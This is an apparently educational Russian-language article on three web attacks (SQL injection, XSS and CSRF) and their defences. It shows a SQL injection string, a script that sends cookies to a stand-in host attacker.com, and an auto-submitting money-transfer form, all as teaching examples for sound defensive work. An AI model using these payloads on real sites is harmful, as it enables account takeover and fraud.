XSS, CSRF, SQL-инъекции — три главные атаки на веб

15 апреля 2026 • 12 мин чтения
Поделиться:

Большинство взломов происходит не через хитрые эксплойты нулевого дня, а через три классические уязвимости, которые существуют уже 20 лет. XSS, CSRF и SQL-инъекции до сих пор в топе по количеству атак — потому что разработчики продолжают их допускать.

Уязвимость 1. SQL-инъекция

Самая старая и разрушительная. Происходит, когда пользовательский ввод попадает в SQL-запрос без обработки.

Как это работает

Типичный уязвимый код:

# ОПАСНО! Не делай так
def get_user(username):
    query = "SELECT * FROM users WHERE name = '" + username + "'"
    cursor.execute(query)
    return cursor.fetchone()

# Пользователь вводит: admin' OR '1'='1
# Запрос становится: SELECT * FROM users WHERE name = 'admin' OR '1'='1'
# Условие всегда истинно — вернутся ВСЕ пользователи

Что может сделать злоумышленник:

  • Получить все данные из таблицы.
  • Обойти аутентификацию (зайти без пароля).
  • Удалить таблицы (DROP TABLE users).
  • В некоторых СУБД — выполнить команды на сервере.

Как защититься

Параметризованные запросы. Единственный правильный способ. Значения передаются отдельно от SQL — база сама их экранирует.

# БЕЗОПАСНО
def get_user(username):
    query = "SELECT * FROM users WHERE name = ?"
    cursor.execute(query, (username,))
    return cursor.fetchone()

# Пользователь вводит: admin' OR '1'='1
# База ищет пользователя с буквально таким именем.
# Такого пользователя нет — вернётся пусто

Правила:

  • Никогда не склеивай SQL-строки вручную.
  • Используй ? (SQLite, MySQL) или %s (PostgreSQL) как плейсхолдеры.
  • ORM делает это автоматически — ещё один плюс в её пользу.

Уязвимость 2. XSS (Cross-Site Scripting)

XSS происходит, когда злоумышленник может внедрить JavaScript на твою страницу. Браузер считает его частью сайта и выполняет с твоими правами.

Как это работает

Представь комментарии на сайте. Пользователь оставляет такой текст:

<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

Если сервер вставляет этот комментарий на страницу без экранирования — браузер выполнит скрипт. А скрипт отправит куки злоумышленнику. Куки = доступ к аккаунту.

Что может сделать XSS

  • Украсть сессионные куки и токены.
  • Читать переписку и вводимые данные.
  • Перенаправлять на фишинговые сайты.
  • Менять содержимое страницы — например, подменить форму оплаты.
  • Отправлять запросы от имени пользователя.

Три типа XSS

ТипГде живёт скриптКогда срабатывает
ХранимыйВ базе данныхПри каждой загрузке страницы
ОтражённыйВ URL запросаСразу после клика по ссылке
DOM-basedВ JavaScript на клиентеПри обработке данных на странице

Хранимый — самый опасный. Один раз заразил базу — и все пользователи получают вирус.

Как защититься

Экранируй всё, что выводишь. Заменяй служебные символы на HTML-сущности.

# Плохо: вставляем как есть
html = '<p>' + comment + '</p>'

# Хорошо: экранируем символы
def escape_html(text):
    return (
        text
        .replace('&', '&amp;')
        .replace('<', '&lt;')
        .replace('>', '&gt;')
        .replace('"', '&quot;')
        .replace("'", '&#39;')
    )

html = '<p>' + escape_html(comment) + '</p>'

После экранирования тег <script> превращается в безобидный текст — браузер покажет его, но не выполнит.

Дополнительные меры:

  • Content Security Policy (CSP). HTTP-заголовок, который запрещает выполнение сторонних скриптов.
  • httpOnly cookie. JavaScript не увидит такие куки — украсть их нельзя.
  • Не используй innerHTML. В JS для вставки текста бери textContent.

Уязвимость 3. CSRF (Cross-Site Request Forgery)

CSRF — «межсайтовая подделка запроса». Атака, при которой злоумышленник заставляет браузер пользователя выполнить действие на чужом сайте, где тот уже авторизован.

Как это работает

Ты залогинен в онлайн-банке. Заходишь на другой сайт — например, форум. На форуме спрятана форма:

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="100000">
</form>
<script>document.forms[0].submit();</script>

Ты просто зашёл на страницу — а форма отправляется автоматически. Браузер приложит куки банка (потому что домен банка совпадает) — и банк выполнит перевод. Ты об этом даже не узнаешь.

CSRF работает потому, что браузер автоматически прикладывает куки к запросам на тот домен, где они были выданы. Злоумышленнику не нужно знать твои куки — достаточно заставить браузер их использовать.

Как защититься

CSRF-токены. Главная защита. Сервер выдаёт странице уникальный токен, который нужно приложить к каждому изменяющему запросу. Злоумышленник не знает токен — его запрос не пройдёт.

<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a8f5f167f44f4964e6c998dee827110c">
  <input type="text" name="amount">
  <button>Перевести</button>
</form>

Сервер проверяет: токен из формы совпадает с токеном в сессии? Если нет — отклоняет запрос.

Дополнительные меры:

  • SameSite cookie. Атрибут SameSite=Strict или SameSite=Lax говорит браузеру: не отправляй куки при переходах с других сайтов.
  • Проверка заголовка Referer. Запрос должен прийти с твоего сайта, а не с чужого.
  • Только POST для изменений. GET-запросы не должны менять данные.

Общий принцип: не доверяй пользователю

Все три уязвимости — про одно и то же. Любые данные от пользователя — потенциально опасны. Логин, комментарий, параметр URL, значение формы — всё это может быть оружием.

Правила гигиены:

  1. Валидация. Проверяй, что данные соответствуют ожиданиям. Email — email, число — число, длина в пределах разумного.
  2. Экранирование на выходе. Прежде чем вставить данные в HTML — экранируй.
  3. Параметризация на входе в SQL. Никогда не склеивай запросы вручную.
  4. Токены для действий. Любое изменение состояния — только с CSRF-токеном.
  5. Принцип наименьших привилегий. Приложение должно иметь только те права, что ему нужны.

  • Content Security Policy. Заголовок, который блокирует XSS на уровне браузера.
  • OAuth 2.0. Протокол для безопасной авторизации через чужие сервисы.

Итог

SQL-инъекция, XSS и CSRF — три классические атаки, которые до сих пор работают. От первой спасают параметризованные запросы, от второй — экранирование и CSP, от третьей — CSRF-токены и SameSite cookie. Все три объединяет одно правило: никогда не доверяй пользовательскому вводу.
